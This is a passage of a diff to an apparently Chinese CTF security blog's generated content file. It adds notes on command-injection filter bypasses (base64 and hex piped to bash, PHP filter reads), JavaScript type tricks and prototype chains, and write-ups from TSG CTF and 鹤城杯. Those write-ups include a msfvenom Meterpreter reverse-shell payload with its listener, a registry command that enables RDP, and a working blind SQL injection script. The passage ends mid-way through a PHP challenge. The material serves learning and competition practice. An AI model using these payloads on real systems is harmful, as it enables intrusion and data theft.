@@ -7243,7 +7243,7 @@ save_path为novalue则表示存储在默认的/tmp或/var/lib/php/session目录�
 
 ##### 2.php7.0 filter新特性
 
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;mybackdoor.php</span><br></pre></td></tr></table></figure>
 
 会造成一个segment fault，导致临时文件不会被删除
 
@@ -7298,7 +7298,7 @@ python黑魔法：
 <h2 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h2><p>程序过滤不严谨，导致用户可以将代码注入并执行。高危函数:eval()、assert()、preg_replace()、call_user_func()等等和命令执行的区别是：一个执行系统命令，一个执行PHP代码</p>
 <h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$9</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125;&#x2F;&#x2F; 用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></figure>
 
-<h3 id="过滤某关键字"><a href="#过滤某关键字" class="headerlink" title="过滤某关键字"></a>过滤某关键字</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ca\t y1n\g.php反斜线绕过</span><br><span class="line">cat y1”ng.php 两个单引号绕过</span><br><span class="line">echo “Y2F0IHkxbmcucGhw” | base64 -d | bashbase64 编码绕过</span><br><span class="line">echo “6361742079316E672E706870” | xxd -r -p | bashhex 编码绕过</span><br><span class="line">cat y1 [n] g.php用[]匹配</span><br><span class="line">cat y1n*用*匹配任意</span><br><span class="line">cat y1n?</span><br><span class="line">cat y1&#123;a..z&#125;g </span><br></pre></td></tr></table></figure>
+<h3 id="过滤某关键字"><a href="#过滤某关键字" class="headerlink" title="过滤某关键字"></a>过滤某关键字</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ca\t y1n\g.php反斜线绕过</span><br><span class="line">cat y1”ng.php 两个单引号绕过</span><br><span class="line">echo “Y2F0IHkxbmcucGhw” | base64 -d | bash#base64 编码绕过</span><br><span class="line">echo “6361742079316E672E706870” | xxd -r -p | bash#hex 编码绕过</span><br><span class="line">cat y1 [n] g.php用[]匹配</span><br><span class="line">cat y1n*用*匹配任意</span><br><span class="line">cat y1n?</span><br><span class="line">cat y1&#123;a..z&#125;g </span><br><span class="line">more tlif3</span><br><span class="line">less tlif3</span><br><span class="line">head tlif3</span><br><span class="line">tail tlif3</span><br></pre></td></tr></table></figure>
 
 <h2 id="escapeshellcmd-escapeshellarg绕过"><a href="#escapeshellcmd-escapeshellarg绕过" class="headerlink" title="escapeshellcmd+escapeshellarg绕过"></a>escapeshellcmd+escapeshellarg绕过</h2><h2 id="无参数rce"><a href="#无参数rce" class="headerlink" title="无参数rce"></a>无参数rce</h2><p>shell_exec等无回显函数</p>
 <h3 id="判断方法"><a href="#判断方法" class="headerlink" title="判断方法"></a>判断方法</h3><p>ls;sleep(3)</p>
@@ -8032,7 +8032,71 @@ python黑魔法：
   <entry>
     <title>javascript奇妙的变量类型安全问题</title>
     <url>/2021/10/02/javascript%E5%A5%87%E5%A6%99%E7%9A%84%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<h1 id="变量类型污染问题"><a href="#变量类型污染问题" class="headerlink" title="变量类型污染问题"></a>变量类型污染问题</h1><h2 id="js数据类型"><a href="#js数据类型" class="headerlink" title="js数据类型"></a>js数据类型</h2><p>对象由花括号分割。在括号内部，对象的属性以名称和值对的形式(name:value)来定义，<br>属性由逗号分割<br>var person={}</p>
+    <content><![CDATA[<h1 id="变量类型污染问题"><a href="#变量类型污染问题" class="headerlink" title="变量类型污染问题"></a>变量类型污染问题</h1><h2 id="js数据类型"><a href="#js数据类型" class="headerlink" title="js数据类型"></a>js数据类型</h2><p><strong>值类型(基本类型)</strong>:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">字符串，数字，布尔，对空，未定义，symbol(es6引入一种新的原始数据类型，表示独一无二的值)</span><br></pre></td></tr></table></figure>
+
+<p><strong>引用数据类型</strong>:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对象(object)，数组(array)，函数(function)</span><br></pre></td></tr></table></figure>
+
+<p><strong>对象</strong><br>花括号分割，在括号内部，对象的属性以名称和值对的形式(name : value)来定义<br>属性由逗号分割:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eg:</span><br><span class="line">var person&#x3D;&#123;firstname:&quot;John&quot;,lastname:&quot;Doe&quot;&#125;</span><br><span class="line">此时对象person有三个属性，firstname,lastname</span><br></pre></td></tr></table></figure>
+
+<p><strong>对象属性寻址方式</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;person.lastname;</span><br><span class="line">name&#x3D;person[&quot;lastname&quot;];</span><br></pre></td></tr></table></figure>
+
+<h3 id="json可以发送的数据"><a href="#json可以发送的数据" class="headerlink" title="json可以发送的数据"></a>json可以发送的数据</h3><p>JSON 值可以是：</p>
+<ul>
+<li><p>数字（整数或浮点数）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">发送</span><br><span class="line">1 #typeof number</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>字符串（在双引号中）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">发送</span><br><span class="line">&quot;a&quot;#typeof  string</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>逻辑值（true 或 false）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">发送</span><br><span class="line">true#typeof boolean</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>数组（在中括号中）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">发送</span><br><span class="line">[&quot;a&quot;,&quot;b&quot;]#typeof object</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>对象（在大括号中）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">发送</span><br><span class="line">&#123;&quot;name&quot;: &quot;Tom&quot;,&quot;Grade&quot;:1, &quot;age&quot;:11, &quot;gender&quot;: &quot;M&quot;&#125; #typeof object</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>null</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">发送</span><br><span class="line">null#typeof object</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h3 id="加运算"><a href="#加运算" class="headerlink" title="加运算"></a>加运算</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">字符串+字符串依然得到字符串</span><br><span class="line">字符串+数组也是，其他都是</span><br><span class="line">但如果不是字符串相加，则为</span><br><span class="line">true+true&#x3D;2#因为true为1</span><br><span class="line">基本上除了Number+Number&#x3D;Number，Bool+Bool&#x3D;Number</span><br></pre></td></tr></table></figure>
+
+<h3 id="js各种小trick"><a href="#js各种小trick" class="headerlink" title="js各种小trick"></a>js各种小trick</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一个正数的负大数次方为0，负数的则为-0</span><br><span class="line">NaN和NaN不相等</span><br><span class="line">e++&lt;e--肯定满足；做比较时true为1,false为0</span><br><span class="line">任何非空字符串都为真,js中两个等号为弱类型判断</span><br><span class="line">string(大数)返回Infinity;json.parse()可以处理数字</span><br><span class="line">in对数组来说是判断数组的key</span><br><span class="line">括号json.parse()基本一样效果;json.parse()可以解析__proto__</span><br><span class="line">对null变量进行数组寻址会报错，并且null变量为object</span><br></pre></td></tr></table></figure>
+
+<h1 id="javascript原型链污染"><a href="#javascript原型链污染" class="headerlink" title="javascript原型链污染"></a>javascript原型链污染</h1><h2 id="三种属性"><a href="#三种属性" class="headerlink" title="三种属性"></a>三种属性</h2><p>1.__proto__和constructor属性是对象所独有的:<br>2.prototype属性是函数所独有</p>
+<p>但是由于JS中函数也是一种对象，所以函数也拥有__proto__和constructor属性</p>
+<h3 id="proto"><a href="#proto" class="headerlink" title="__proto__"></a>__proto__</h3><p><strong>proto属性是对象所独有的</strong></p>
+<p><strong>作用：</strong>当访问一个对象的属性时，如果该对象内部不存在这个属性，那么他就会去它的proto属性所指向的那个对象（理解为父对象），如果父对象也没有，则在往上找，如果一直到原型链顶端都没有该属性，就会报错</p>
+<p>这种通过__proto__属性来连接对象直到null的一条链即为我们所谓的原型链。其实我们平时调用的字符串方法、数组方法、对象方法、函数方法等都是靠__proto__继承而来的。</p>
+<h3 id="prototype属性"><a href="#prototype属性" class="headerlink" title="prototype属性"></a>prototype属性</h3><p>它是函数所独有的，是从函数指向对象，并且是函数的原型对象，也就是这个函数（其实所有函数都可以作为构造函数）所创建的实例的原型对象，由此可知</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f1.__proto__&#x3D;&#x3D;Foo.prototype</span><br></pre></td></tr></table></figure>
+
+<p>**作用:**包含可以由特定类型的所有实例所共享的属性和方法，也就是让该函数所实例化的对象们都可以找到公用的属性和方法，任何函数在创建的时候，其实会默认同时创建该函数的prototype对象</p>
+<h3 id="constructor属性"><a href="#constructor属性" class="headerlink" title="constructor属性"></a>constructor属性</h3><p>它是对象才拥有的，他是从一个对象指向一个函数，含义就是指向该对象的构造函数，每个对象都有构造函数</p>
+<h2 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h2><p>eg:<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211005134652.png" alt="img" style="zoom:67%;"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var a &#x3D; &#123;&#125;;</span><br><span class="line">console.log(a.__proto__); &#x2F;&#x2F;Object &#123;&#125;</span><br><span class="line">console.log(a.__proto__ &#x3D;&#x3D;&#x3D; a.constructor.prototype); &#x2F;&#x2F;true</span><br></pre></td></tr></table></figure>
+
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>1.我们需要牢记两点：①__proto__和constructor属性是对象所独有的；②prototype属性是函数所独有的，因为函数也是一种对象，所以函数也拥有__proto__和constructor属性。</p>
+<p>2.__proto__属性的作用就是当访问一个对象的属性时，如果该对象内部不存在这个属性，那么就会去它的__proto__属性所指向的那个对象（父对象）里找，一直找，直到__proto__属性的终点null，再往上找就相当于在null上取值，会报错。通过__proto__属性将对象连接起来的这条链路即我们所谓的原型链。</p>
+<p>3.prototype属性的作用就是让该函数所实例化的对象们都可以找到公用的属性和方法，即f1.<strong>proto</strong> === Foo.prototype。(意思是让f1可以找到公用的属性方法，即向上找有prototype给他)</p>
+<p>4.constructor属性的含义就是指向该对象的构造函数，所有函数（此时看成对象了）最终的构造函数都指向Function。</p>
+<h1 id="javascript基础语法"><a href="#javascript基础语法" class="headerlink" title="javascript基础语法"></a>javascript基础语法</h1><h2 id="传输数据"><a href="#传输数据" class="headerlink" title="传输数据"></a>传输数据</h2><h3 id="1-req-params-req-query-req-body"><a href="#1-req-params-req-query-req-body" class="headerlink" title="1.req.params/req.query/req.body"></a>1.req.params/req.query/req.body</h3><p><strong>req.params</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eg:&#x2F;modify&#x2F;:file</span><br><span class="line">&#x2F;modify&#x2F;index</span><br><span class="line">那么req.params.file&#x3D;index</span><br></pre></td></tr></table></figure>
+
+<p><strong>req.query</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eg:</span><br><span class="line">?id&#x3D;2</span><br><span class="line">那么req.query.id那么就可以得到2</span><br></pre></td></tr></table></figure>
+
+<p><strong>req.body(针对post请求)</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eg:</span><br><span class="line">post:username&#x3D;adbc</span><br><span class="line">req.body.username&#x3D;adbc</span><br></pre></td></tr></table></figure>
+
+<h2 id="定义变量"><a href="#定义变量" class="headerlink" title="定义变量"></a>定义变量</h2><p><strong><code>const</code>:</strong> 用于定义不可变变量<br>**<code>var</code> 声明语句<strong>声明一个变量，并可选地将其初始化为一个值<br>**<code>process.env</code></strong>:返回包含用户环境的对象</p>
 ]]></content>
   </entry>
   <entry>
@@ -8085,6 +8149,243 @@ python黑魔法：
 <p>在下条流量中就发现了返回的数据，提取其base64形式，再对其进行解码操作<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211002200208.png" alt="img" style="zoom:67%;"></p>
 <p>即可拿到flag<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211002200201.png" alt="img" style="zoom:67%;"></p>
 <p>看了一下大佬的题解，发现自己昨天就是困在套娃代码不知道如何解开的步骤</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>2021国赛总决赛复现</title>
+    <url>/2021/10/09/2021%E5%9B%BD%E8%B5%9B%E6%80%BB%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h2 id="babypython-国赛总决赛复现"><a href="#babypython-国赛总决赛复现" class="headerlink" title="babypython[国赛总决赛复现]"></a>babypython[国赛总决赛复现]</h2>]]></content>
+  </entry>
+  <entry>
+    <title>TSG2021+0ctf</title>
+    <url>/2021/10/05/TSG2021/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>战队让加的比赛讨论群一个没少加，题目也是一个都不会，就把一些感觉现阶段可以学懂的题目复现一下试试看</p>
+<h2 id="Welcome-to-TSG-CTF"><a href="#Welcome-to-TSG-CTF" class="headerlink" title="Welcome to TSG CTF!"></a>Welcome to TSG CTF!</h2><p>签到题，签了很多人</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;<span class="attr">promises</span>: fs&#125; = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fastify = <span class="built_in">require</span>(<span class="string">&#x27;fastify&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag = process.env.FLAG || <span class="string">&#x27;DUMMY&#123;DUMMY&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = fastify();</span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">async</span> (_, res) =&gt; &#123;</span><br><span class="line">    res.type(<span class="string">&#x27;text/html&#x27;</span>).send(<span class="keyword">await</span> fs.readFile(<span class="string">&#x27;index.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line">app.post(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> req.body === <span class="string">&#x27;object&#x27;</span> &amp;&amp; req.body[flag] === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(<span class="string">`Nice! flag is <span class="subst">$&#123;flag&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.send(<span class="string">`You failed...`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">34705</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>关键的代码在</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typeof req.body &#x3D;&#x3D;&#x3D; &#39;object&#39; &amp;&amp; req.body[flag] &#x3D;&#x3D;&#x3D; true</span><br></pre></td></tr></table></figure>
+
+<p>意思是说，post传入的数据的typeof为object，并且这个数据的[flag]要为true，这里就需要理解一下什么是[flag]，比如说flag是abc那么他就是[abc]，比如说我传入一个tlif3，那么我就要有一个tlif3[abc]=true，很显然，这是不可能达成的，因为我们根本不知道flag的值为多少，那么这里就有一个小trick<br>首先typeof 为object的有数组对象，<strong>还有一个null</strong>，而如果针对null进行寻址的话，就会报错，此时报错就会将flag的值给带出<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211005192353.png" alt="img" style="zoom:67%;"></p>
+<h2 id="Win-Win"><a href="#Win-Win" class="headerlink" title="Win-Win"></a>Win-Win</h2><p>刚刚去看了一下，发现没环境了—于是就把题解说的看一下吧</p>
+<h3 id="windows找后台目录"><a href="#windows找后台目录" class="headerlink" title="windows找后台目录"></a>windows找后台目录</h3><p>Windows 在搜索文件的时候使用到了FindFirstFile 这一个winapi 函数，该函数到一个文件夹(包括子文件夹) 去搜索指定文件。<br><strong>利用方法:</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们只要将文件名不可知部分之后的字符用“&lt;”或者“&gt;”代替即可，不过要注意的一点是，只使用一个“&lt;”或者“&gt;”则只能代表一个字符，如果文件名是12345或者更长，这时候请求“1&lt;”或者“1&gt;”都是访问不到文件的，需要“1&lt;&lt;”才能访问到，代表继续往下搜索，有点像Windows的短文件名，这样我们还可以通过这个方式来爆破目录文件了。</span><br></pre></td></tr></table></figure>
+
+
+<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211005203906.png" alt="img" style="zoom:50%;">
+
+<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211005203939.png" alt="img" style="zoom: 50%;">
+
+
+<p>可以发现在windows系统下是可以这样进行读取文件的操作，那么这就意味着，我们只需要对首字母进行爆破即可<br>参考:<br><a href="https://blog.csdn.net/bylfsj/article/details/102771173">https://blog.csdn.net/bylfsj/article/details/102771173</a></p>
+<p>然后寻找配置文件之类的进行读取，<br>最后再包含xampp的 <code>apache_start.bat</code>文件成功：<code>?win=..\..\t&lt;\apache_start.bat</code>。</p>
+<p>读取php.ini文件：<code>?win=..\..\t&lt;\php\phpi.ini</code>，发现了路径：<code>C:\THIS_IS_A_SECRET_PATH_107B1177348CC063A0713838282B1C27892D5FE2\</code></p>
+<p>然后session文件上传，但是题目本来说不可以的，所以应该就是非预期解了<br>然后本地生成msf马</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;xx.xx.xx.xx lport&#x3D;5555 -f exe -o shell.exe</span><br></pre></td></tr></table></figure>
+
+<p>并在服务器进行监听</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">Set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">Set lhost 0.0.0.0</span><br><span class="line">Set lport 5555</span><br><span class="line">Run</span><br></pre></td></tr></table></figure>
+
+<p>使用getsystem进行提权登录界面，因为要截图</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>screenshot</code>没有权限。打开3389端口，修改administrator密码：</p>
+<p>即可在桌面上看到flag</p>
+<h2 id="RevengePHP"><a href="#RevengePHP" class="headerlink" title="RevengePHP"></a>RevengePHP</h2>]]></content>
+  </entry>
+  <entry>
+    <title>2021鹤城杯</title>
+    <url>/2021/10/08/2021%E9%B9%A4%E5%9F%8E%E6%9D%AF/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天满课了，抽时间打了一下鹤城杯，web做了两题，第三题感觉可以做的，因为在去上课的路上查到了bypass的手法，不过后面学长也做出来了，tql，然后做了两题流量取证的misc，还不错，这里就就贴一下自己做出来的几题，顺便记录一下其他没做出来的题</p>
+<h2 id="middle-magic"><a href="#middle-magic" class="headerlink" title="middle_magic"></a>middle_magic</h2><p>考烂的php黑魔法<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211008111921.png" alt="img" style="zoom:67%;"></p>
+<h2 id="流量取证"><a href="#流量取证" class="headerlink" title="流量取证"></a>流量取证</h2><p>盲注找flag<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211008112006.png" alt="img" style="zoom:67%;"></p>
+<p>flag{w1reshARK_ez_1sntit}</p>
+<h2 id="easy-sql-2"><a href="#easy-sql-2" class="headerlink" title="easy_sql_2"></a>easy_sql_2</h2><p>拿了一个十血，但是感觉可以更快的，可惜早上有课</p>
+<p>过滤了select，联想到堆叠或者mysql8.0的table<br>测试了一下发现是mysql8.0，故用table进行注入</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_injection</span>(<span class="params">pay_lo</span>):</span><span class="comment">#库名和版本</span></span><br><span class="line">    fina_wod=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        low=<span class="number">32</span></span><br><span class="line">        high=<span class="number">128</span></span><br><span class="line">        mid=(low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">            payload_1=<span class="string">f&quot;admin&#x27;and ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>#&quot;</span>.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;/**/&quot;</span>)</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>:payload_1,</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>:<span class="string">&quot;1&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">#print(data)</span></span><br><span class="line">            r=s.post(url=url,data=data).text</span><br><span class="line">            print(r)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;password error!&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">128</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        fina_wod += chr(mid)</span><br><span class="line">        print(fina_wod)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_injection_s</span>():</span><span class="comment">#表名</span></span><br><span class="line">    fina_wod=<span class="string">&quot;&quot;</span></span><br><span class="line">    a=<span class="string">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">62</span>):</span><br><span class="line">            <span class="comment">#payload_2=f&quot;admin&#x27;and ((&#x27;def&#x27;,&#x27;ctf&#x27;,&#x27;&#123;fina_wod+a[j]&#125;&#x27;,&#x27;&#x27;,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1)&lt;(table information_schema.tables order by TABLE_SCHEMA limit 1,1))#&quot;.replace(&quot; &quot;,&quot;/**/&quot;)</span></span><br><span class="line">            payload_2=<span class="string">f&quot;admin&#x27;and (&#x27;ctf&#x27;,&#x27;<span class="subst">&#123;fina_wod+a[j]&#125;</span>&#x27;,1,1,1,1)&lt;(table mysql.innodb_table_stats order by database_name limit 1,1)#&quot;</span>.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;/**/&quot;</span>)</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>:payload_2,</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>:<span class="string">&quot;1&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            r = s.post(url=url, data=data).text</span><br><span class="line">            print(payload_2)</span><br><span class="line">            print(r)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username error&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">                fina_wod+=a[j<span class="number">-1</span>]</span><br><span class="line">                print(fina_wod)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_co</span>():</span><span class="comment">#探测表在第几个</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10000</span>):</span><br><span class="line">        <span class="comment">#payload=f&quot;admin&#x27;and/**/(&#x27;def&#x27;,&#x27;ct&#x27;,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1)&lt;(table information_schema.tables order by table_schema desc limit &#123;i&#125;,1)#&quot;.replace(&quot; &quot;,&quot;/**/&quot;)</span></span><br><span class="line">        payload=<span class="string">f&quot;admin&#x27;and/**/(&#x27;ct&#x27;,1,1,1,1,1)&lt;(table mysql.innodb_table_stats order by database_name limit <span class="subst">&#123;i&#125;</span>,1)#&quot;</span>.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;/**/&quot;</span>)</span><br><span class="line">        data1=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="string">&quot;123&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#print(data1)</span></span><br><span class="line">        <span class="comment">#print(s.post(url=url,data=data1).text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;username error!&quot;</span> <span class="keyword">in</span> s.post(url=url,data=data1).text:</span><br><span class="line">            print(<span class="string">&quot;ctf库在第&quot;</span>,i,<span class="string">&quot;列&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#payload=&quot;database()&quot;#ctf</span></span><br><span class="line">    <span class="comment">#payload=&quot;version()&quot;#8.0.26-0ubuntu0.20.04.2</span></span><br><span class="line">    payload=<span class="string">&quot;table fl11aag limit 1,1&quot;</span></span><br><span class="line">    <span class="comment">#search_co()</span></span><br><span class="line">    <span class="comment">#print_word()</span></span><br><span class="line">    sql_injection(payload)</span><br><span class="line">    <span class="comment">#sql_injection_s()</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211008130426.png" alt="img"></p>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2> <img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211008214810.png" alt="img" style="zoom:67%;">
+<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211008214808.png" alt="img" style="zoom:67%;">
+
+<p>依旧是盲注找flag，没啥好说的，不过前面的好像是图片隐写啥的，没做出来，xy大佬发给我的这个流量取证的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">99,100,50,99,51,101,50,102,101,97,52,54,51,100,101,100,57,97,102,56,48,48,100,55,49,53,53,98,101,55,97,113,125</span><br></pre></td></tr></table></figure>
+
+<h2 id="easyp"><a href="#easyp" class="headerlink" title="easyp"></a>easyp</h2><p>同样是黑魔法</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">    $guess = (<span class="keyword">string</span>) $_POST[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($guess === $secret) &#123;</span><br><span class="line">        $message = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . $flag;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $message = <span class="string">&#x27;Wrong. Try Again&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, $_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/show_source/&#x27;</span>, $_SERVER[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(basename($_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    